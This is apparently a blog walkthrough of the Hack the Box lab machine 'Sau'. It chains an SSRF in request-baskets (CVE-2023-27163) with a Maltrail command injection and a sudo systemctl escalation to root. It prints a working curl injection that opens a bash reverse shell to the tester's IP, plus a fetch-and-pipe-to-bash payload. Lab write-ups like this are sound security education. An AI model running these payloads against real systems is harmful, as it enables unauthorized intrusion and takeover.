+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2023-04-29T11:00:00.000Z
publishDate = 2023-04-29T11:00:00.000Z
description = " "
summary = " "
draft = false
slug = "hack-the-box-sau"
tags = ["hack the box", "Easy", "Linux", "SSRF", "Burpsuite", "OS Command Injection", "Maltrail", "CVE-2023-27163", "Request Basket"]
title = "Hack the Box - Sau"
url = "/hack-the-box-sau"
thumbnail = "/images/sau/logo.png"
+++

Welcome back! Today we're going to be doing the Hack the Box machine Sau. This machine is listed as an easy Linux machine. So let's jump and see what we find!

As usual, we start with port scan. I'm a fan of `rustscan`. Here's what we see:

Command:
`rustscan -a 10.129.229.26 -- -sV -sC`

Results:
```
pen  ssh     syn-ack
55555/tcp open  unknown syn-ack
```

Well then, a small vector here. Let's see what's being hosted on `55555`. Taking a look via web browser we see an interesting interface. 

![](/images/sau/sau1.png)

When we hit the 'create' button, we are given a basket with a token:

![](/images/sau/sau2.png)

Ok, so we have a 'basket' and a token: `X-sgJT8xpQp6OPbenqX7wxy1KbeP3SKPAwTmLT4l0gcl`
(sorry `Burpsuite`, new token is also - `P8YdnUstfyHHALexlcZIWJ1WqXkDrOi_jsNHGiARKf0w`)

Now, looking at the requests via `Burpsuite`, there doesn't seem to be much going on here. What is interesting is that this version of `requests-basket` is on version 1.2.1. [Some quick Googling](https://cve.report/CVE-2023-27163) around shows us there is some `SSRF` action in play here.

Diving into the disclosure - [here](https://notes.sjtu.edu.cn/s/MUUhEymt7) - we can see that all we need to do is craft a request to the proper endpoint and we can potentially escalate ourselves from here. So first we snag a request and send it to `repeater`. Nowe we can modify the request to have our payload:

![](/images/sau/sau3.png)

Next we setup a `netcat` listener on the port we stated in the request.

Command:
`nc -lvnp 6969`

Then we send the request and visit the endpoint / bucket we just created. This gives us a token back. According to the original finder, we need to visit the endpoint to trigger the `SSRF`.

![](/images/sau/sau4.png)

...anndddd our connection back.

![](/images/sau/sau5.png)

Now, we need to repoint this to itself so we can start enumerating internally. The first thing we do is point the `forward_url` value to the `localhost` and see what comes back. Sure enough, we actually get something, but not what I expected!

![](/images/sau/sau6.png)

Another service is actually running on port `80`! This case, we have a `maltrail` instance. Googling about lead me [here](https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87). Looks to be a `unauthenticeated OS Command Injection` available to us. Now for this to work, we see we need to hit the `login` page on that service. So to test if it's even available, we simple change our payload about from the `localhost` to `127.0.0.1:80/login` and see what happens.

![](/images/sau/sau7.png)

Sure enough, we can hit it. Now we need to chain our exploits together. Step one - Create a new basket to post to. Step two create a reverse shell payload to call back to us. First we create a new basket with the `forward_url` set to the `/login` endpoint on the local host. 

![](/images/sau/sau8.png)

We send that request. Next up, start a `netcat` listener on the port we want to catch incoming. 

```
nc -lvnp 6969
```

Now, we need to a reverse shell. We'll use the same PoC as we found, just modified:

```bash
curl 'http://10.129.229.26:55555/trash9' --data 'username=;`bash -i >& /dev/tcp/10.10.14.2/6969 0>&1`'
```

The above didn't work, so a quick work around is to create a script with the command inside of it and curl that file, then pipe it out to bash. Here's our `shell.sh` script:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.2/6969 0>&1"
```

Now we need to serve this file, for that we'll use the Python3 module.

Command:
```
python3 -m http.server 80
```
With that being hosted, we can now send our new `curl` request.

```bash
curl 'http://10.129.229.26:55555/trash9' --data 'username=;`curl 10.10.14.2/shell.sh | bash`'
```

Sure enough, after we let it rip, we see it hit out `Simple HTTP Server` then right after it our `netcat` listener!

![](/images/sau/sau9.png)

We head back to the `home` directory and check for our `user.txt` flag. 

![](/images/sau/user.png)

Next up, enumerate for escalation. A quick `sudo -l` shows us we have access to run some `systemctl` functions. If you've been around the CTF space, Red Team or Pentesting space for a while, you may recognize this one. You can pop over to [GTFO Bins](https://gtfobins.github.io/gtfobins/systemctl/) and find your answer.

So since we have a lame reverse connection, we need to upgrade our `TTY`. A quick and easy fix for this is simple:

```
script /dev/null -c bash
```
NOTE: If we don't upgrade our `TTY`, we wont be able to leverage the following exploit. So make sure you do that, in whatever fashion you like.

Now we can simple run our exploit.

Command:
```bash
sudo /usr/bin/systemctl status trail.service
```
Then we provide the `!sh` option.

![](/images/sau/sau10.png)

There we go, our `root.txt` flag and another box down!